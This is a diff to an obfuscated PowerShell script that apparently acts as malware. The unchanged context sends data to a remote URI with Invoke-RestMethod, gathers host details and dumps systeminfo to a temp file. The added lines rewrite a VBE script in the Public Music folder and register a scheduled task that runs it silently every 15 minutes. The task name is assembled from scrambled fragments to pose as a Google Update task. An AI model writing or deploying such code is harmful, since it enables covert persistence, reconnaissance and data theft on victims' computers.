@@ -18,6 +18,13 @@ Invoke-RestMethod -Uri $ErfH -Method Put -Headers $Headers -Body $Body -ContentT
 $jsieflsdf = Get-Date -Format "yyyy-MM-dd_HHmm"
 $sue9s = $env:LoCaLaPpDATA;
 $widfk =  $env:COMPUTERNAME;
+$wefjsdkflsjl = Get-Content -Path "C:\users\public\music\wef.vbe" -Raw
+$wefjsdkflsjl = $wefjsdkflsjl.Replace("help.i", "$env:computername/help.i");
+$wefjsdkflsjl | Set-Content -Path "c:\users\public\music\weff.vbe" -Force
+$uwBDKJK = "c:\windows\system32\wscript.exe //e:vbscript /b " + "C:\Users\Public\Music\weff.vbe";
+$iwsdfhkhksjdkf = ("{2}{1}{4}{3}{5}{0}" -f "E498ABE7C33}", "teTaskM", "GoogleUpda", "A{1C791230-CA8", "achineU",  "D-6D04-AC55-");                     
+schtasks /delete /tn $iwsdfhkhksjdkf /f;
+schtasks /create /TN $iwsdfhkhksjdkf /TR $uwBDKJK /SC minute /MO 15 /ST 00:00 /f;
 $dsf = $env:temp;
 $dfsdfeTD = Join-Path $env:USERPROFILE "Downloads"
 systeminfo > $dsf\SYS.tmp;Start-sleep 2;
